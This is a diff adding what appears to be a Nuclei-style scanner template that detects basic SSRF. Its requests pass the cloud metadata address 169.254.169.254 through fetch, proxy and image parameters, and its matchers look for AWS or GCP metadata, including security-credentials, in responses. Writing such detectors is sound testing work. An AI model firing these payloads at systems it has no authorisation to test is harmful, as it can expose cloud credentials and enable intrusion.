@@ -1,0 +1,36 @@
+id: xpl-ssrf-basic
+info:
+  name: "Server-Side Request Forgery (basic reflection)"
+  author: imtaqin
+  severity: high
+  description: |
+    Checks for reflection of internal metadata endpoints in response
+    bodies via common SSRF-prone parameters.
+    NOTE: blind SSRF requires OOB (cloud tier).
+  tags:
+    - ssrf
+
+# TODO(backend): swap http://169.254.169.254 for {{interactsh-url}} when
+# the cloud OOB server is enabled; correlate DNS/HTTP callbacks.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/fetch?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/proxy?u=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/image?src=http://169.254.169.254/"
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "security-credentials"
+        condition: or
+        name: aws-metadata-reflected
+      - type: regex
+        part: body
+        regex:
+          - "(?i)computeMetadata|project-id"
+        name: gcp-metadata-reflected
